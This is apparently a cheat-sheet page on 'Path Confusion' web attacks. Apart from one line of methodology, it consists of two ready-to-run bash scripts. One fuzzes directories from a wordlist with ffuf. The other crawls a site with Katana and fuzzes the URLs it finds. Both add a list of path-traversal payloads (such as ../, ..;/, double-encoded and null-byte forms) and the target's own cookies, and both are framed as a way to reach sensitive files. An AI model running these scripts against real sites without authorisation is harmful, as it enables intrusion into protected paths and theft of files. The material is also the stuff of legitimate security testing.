# Path Confusion

## Check List

* [ ] Make sure application paths are configured correctly.

## Cheat Sheet

### Methodology

{% stepper %}
{% step %}
Using the following script, we can create confusion on a sensitive path using the Path Confusion technique. Using this script, we can basically find sensitive files or sensitive paths. Using the symbols specified in the script, we can confuse the path on the sensitive path and access this sensitive path
{% endstep %}
{% endstepper %}

***

### Dictionary Fuzzer

#### [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano pc-dict-fuzzer.sh
```

```bash
#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <WEBSITE>"
    exit 1
fi

WEBSITE="$1"

# Validate URL format
if ! [[ "$WEBSITE" =~ ^https?:// ]]; then
    echo "Error: WEBSITE must start with http:// or https://"
    exit 1
fi

# Create temporary files
URLS_FILE=$(mktemp)
COOKIE_FILE=$(mktemp)
PAYLOAD_FILE=$(mktemp)

# Cleanup function
cleanup()
{
    rm -f "$URLS_FILE" "$COOKIE_FILE" "$PAYLOAD_FILE"
}
trap cleanup EXIT

# Define path confusion payloads
cat > "$PAYLOAD_FILE" << EOF
%2e%2e
%2F
%2e%2F
%2f%2e
%2e%2e%2f
%2e%2e%2f%2e%2e%2f
%2f%2e%2e%2f
%2f%2e%2e
%252e%252e%252f
..;/
.;/
../
..../
....//
/..;/
/../
/..%00/
/./
%3f
%5c
%252f
/%2e%2e/
;/../
././
%5c%2e%2e%5c
..;/..
EOF

# User-Agent and headers
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0"

HEADERS=(
    "User-Agent: $USER_AGENT"
    "Accept: */*"
    "Accept-Language: en-US,fa-IR;q=0.5"
    "Accept-Encoding: gzip, deflate, br, zstd"
    "Connection: keep-alive"
    "Upgrade-Insecure-Requests: 1"
    "Sec-Fetch-Dest: script"
    "Sec-Fetch-Mode: no-cors"
    "Sec-Fetch-Site: cross-site"
    "DNT: 1"
    "Sec-GPC: 1"
    "Priority: u=0, i"
    "Te: trailers"
)

# Extract cookies from response headers
curl -s -I "$WEBSITE" | awk 'BEGIN {IGNORECASE=1} /^set-cookie:/ {print substr($0, 13)}' > "$COOKIE_FILE"

# Process cookies
COOKIES=$(awk -F';' '{print $1}' "$COOKIE_FILE" | tr '\n' '; ' | sed 's/; $//')

# Append cookies if available
if [[ -n "$COOKIES" ]]; then
    HEADERS+=("Cookie: $COOKIES")
fi

# Convert headers into ffuf parameters
HEADER_PARAMS=()
for HEADER in "${HEADERS[@]}"; do
    HEADER_PARAMS+=("-H" "$HEADER")
done

# Run ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt:DIR \
     -w "$PAYLOAD_FILE":PAYLOAD \
     -u "$WEBSITE/DIR/PAYLOAD" \
     -ac -c -v -mc 200 \
     "${HEADER_PARAMS[@]}"
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x pc-dict-fuzzer.sh;sudo ./pc-dict-fuzzer.sh $WEBSITE
```

### Crawl Fuzzer

#### [FFUF ](https://github.com/ffuf/ffuf)& [Katana](https://github.com/projectdiscovery/katana)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano pc-crawl-fuzzer.sh
```

```bash
#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <WEBSITE>"
    exit 1
fi

WEBSITE="$1"

# Validate URL format
if ! [[ "$WEBSITE" =~ ^https?:// ]]; then
    echo "Error: WEBSITE must start with http:// or https://"
    exit 1
fi

# Create temporary files
KATANA_OUTPUT=$(mktemp)
URLS_FILE=$(mktemp)
COOKIE_FILE=$(mktemp)
PAYLOAD_FILE=$(mktemp)

# Cleanup function
cleanup()
{
    rm -f "$KATANA_OUTPUT" "$URLS_FILE" "$COOKIE_FILE" "$PAYLOAD_FILE"
}
trap cleanup EXIT

# Run katana to gather URLs
katana -u $WEBSITE \
       -fr "(static|assets|img|images|css|fonts|icons)/" \
       -o "$KATANA_OUTPUT" \
       -xhr-extraction \
       -automatic-form-fill \
       -silent \
       -strategy breadth-first \
       -js-crawl \
       -extension-filter jpg,jpeg,png,gif,bmp,tiff,tif,webp,svg,ico,css \
       -headless --no-sandbox \
       -known-files all \
       -field url \
       -sf url

# Filter and clean extracted URLs
grep -Ev '\.js$|&amp' "$KATANA_OUTPUT" | sort -u > "$URLS_FILE"

# Define path confusion payloads
cat > $PAYLOAD_FILE << EOF
%2e%2e
%2F
%2e%2F
%2f%2e
%2e%2e%2f
%2e%2e%2f%2e%2e%2f
%2f%2e%2e%2f
%2f%2e%2e
%252e%252e%252f
..;/
.;/
../
..../
....//
/..;/
/../
/..%00/
/./
%3f
%5c
%252f
/%2e%2e/
;/../
././
%5c%2e%2e%5c
..;/..
EOF

# User-Agent and headers
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0"

HEADERS=(
    "User-Agent: $USER_AGENT"
    "Accept: */*"
    "Accept-Language: en-US,fa-IR;q=0.5"
    "Accept-Encoding: gzip, deflate, br, zstd"
    "Connection: keep-alive"
    "Upgrade-Insecure-Requests: 1"
    "Sec-Fetch-Dest: script"
    "Sec-Fetch-Mode: no-cors"
    "Sec-Fetch-Site: cross-site"
    "DNT: 1"
    "Sec-GPC: 1"
    "Priority: u=0, i"
    "Te: trailers"
)

# Extract cookies from response headers
curl -s -I "$WEBSITE" | awk 'BEGIN {IGNORECASE=1} /^set-cookie:/ {print substr($0, 13)}' > "$COOKIE_FILE"

# Process cookies
COOKIES=$(awk -F';' '{print $1}' "$COOKIE_FILE" | tr '\n' '; ' | sed 's/; $//')

# Append cookies if available
if [[ -n "$COOKIES" ]]; then
    HEADERS+=("Cookie: $COOKIES")
fi

# Convert headers into ffuf parameters
HEADER_PARAMS=()
for HEADER in "${HEADERS[@]}"; do
    HEADER_PARAMS+=("-H" "$HEADER")
done

# Run ffuf
ffuf -w $URLS_FILE:URL \
     -w $PAYLOAD_FILE:PAYLOAD \
     -u URL/PAYLOAD \
     -ac -c -v -mc 200 \
     "${HEADER_PARAMS[@]}"
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x pc-crawl-fuzzer.sh;sudo ./pc-crawl-fuzzer.sh $WEBSITE
```
